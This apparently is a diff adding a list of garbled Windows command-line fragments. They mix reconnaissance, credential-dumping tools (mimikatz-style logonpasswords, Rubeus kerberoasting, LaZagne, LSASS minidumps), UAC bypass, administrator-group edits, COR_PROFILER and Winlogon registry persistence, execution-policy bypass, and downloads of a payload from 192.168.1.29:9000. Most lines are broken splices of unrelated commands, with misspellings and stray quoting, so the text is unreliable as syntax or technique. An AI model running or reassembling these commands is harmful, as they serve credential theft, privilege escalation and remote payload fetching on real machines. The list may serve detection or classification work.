@@ -1,0 +1,64 @@
+namp -sn /add
+fsutil.exe trace decode
+rubeus.exe kerberoast :logonpasswords
+hostname
+remove-item -path = $ target ;
+iediagcmd.exe /out '' $ { email_address
+net localgroup `` administrators '' /v `` cor_profiler '' reg_dword /d /f
+nmap -o $ wscriptshell.createshortcut ( `` $ target t1547.009 ; in ;
+get-localgroup
+attrib +h
+for ( `` $ : \windows\temp\dumpert.dmp
+adfind.exe -o /y
+lazagne.exe windows
+net localgroup `` administrators '' '' /v cor_profiler ''
+quser
+net user administrator /add admins `` `` cor_profiler '' -name `` threadingmodel '' ''
+bitsadmin.exe /setnotifycmdline $ { bits_job_name } -l '' $ { filename_regex } -t -t $ { target_ip } -t $ true -t $ { command } username= $ profile
+quser
+net localgroup `` administrators '' /t cor_profiler ''
+iediagcmd.exe /out $ { directory_path }
+net localgroup `` administrators '' -name `` cor_profiler '' '' /t reg_multi_sz
+bypassuac.exe $ target '' /add
+net localgroup administrators `` # `` hklm\software\microsoft\windows t1547.009 player ''
+git clone = $ : cor_profiler
+net localgroup `` administrators '' '' -name `` localaccount=true
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file \users\ $ : \users\ $ `` hklm\system\currentcontrolset\control\session volumn name you copy \users\
+nmap -o $ { filename_regex }
+sekurlsa : :logonpasswords
+get-wmiobject /start | -classname buildnumber ' ] ] : '' $ : :frombase64string hkcu : \windows\system32\at.exe /active : hklm\system\currentcontrolset\services\winsock2\parameters ; @ set-wmiinstance = administrators '' -name cor_profiler ''
+quser
+tasklist
+net localgroup `` administrators '' -name `` driver '' /f
+[ myprocess minidump i ; -n $ a -accepteula `` keylog
+ffuf -w inprocserver32 , $ { user_name }
+namp -sn -l $ target '' `` cor_profiler '' '' '' -name $ -name `` administrators '' '' -name `` threadingmodel '' -name threadingmodel '' -name inprocserver32 ''
+$ target = `` cor_profiler = `` cor_profiler '' '' , threadingmodel ''
+namp -sn -l $ target t1547.009 . = `` windir '' \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' -name '' -name `` $ true in '' '' c '' /y $ { bits_job_name -path '' '' -o
+copy-item `` hklm\software\microsoft\windows powershell `` cor_profiler '' '' ;
+set-executionpolicy -executionpolicy bypass bypass
+conhost.exe [ el | = http : new-object new-object net.webclient //192.168.1.29:9000/payload/redirect.sdb -o localappdata ;
+net localgroup = administrators '' '' /v `` cor_profiler '' -name $ `` administrators '' '' -name `` threadingmodel '' -name threadingmodel '' ''
+powershell -executionpolicy bypass -command $ : cor_profiler '' administrators
+bypassuac.exe \appdata\local\temp\lsass.dmp
+stordiag.exe
+$ consumerargs = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' ; -t $ wscriptshell.createshortcut % temp % temp % @ % \programdata\microsoft\windows\start windir % \system32\osk.exe /grant administrators -name : \programdata\microsoft\windows\start team '' -name `` explorer.exe , $ '' '' /v enabled '' -name `` threadingmodel '' -name ''
+net localgroup `` administrators '' '' /v `` hklm\software\microsoft\windows /v cor_profiler '' -name `` threadingmodel '' -name $ : inputprovider '' '' /grant administrators '' -value `` threadingmodel '' ''
+conhost.exe ( new-object net.webclient :list -r -p $ i -count $ profile
+nmap -o $ { volumn name you ( set-wmiinstance = minidump http http : //192.168.1.29:9000/payload/redirect.sdb -o ; querylanguage= = `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' -name reg_dword /d userinit.exe -name `` threadingmodel '' = `` threadingmodel '' -name $ appinit_dlls ''
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword '' /d binary_file_path ''
+quser
+net localgroup administrators `` hklm\system\currentcontrolset\services\winsock2\parameters '' '' /t cor_profiler ''
+powershell -executionpolicy bypass -command '' '' from 1
+temp `` .\lazagne exe all
+ffuf -w $ filterargs
+nmap -o $ filterargs
+lazagne.exe windows
+cmdkey /list
+% localappdata % \microsoft\teams\current\teams.exe
+add `` localaccount=true $ `` 7 /v `` : cor_profiler = ' http http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup administrators `` '' /f /grant cor_profiler '' administrators ''
+net localgroup
+theharvester -t $ consumerargs = `` cor_profiler = `` '' c `` cor_profiler = cor_profiler '' ''
+powershell -executionpolicy net.securityprotocoltype ] : \windows\system32\at.exe $ : username ) admins `` $ '' account cor_profiler '' ''
+python make_image.py $ shortcut = `` domain /domain
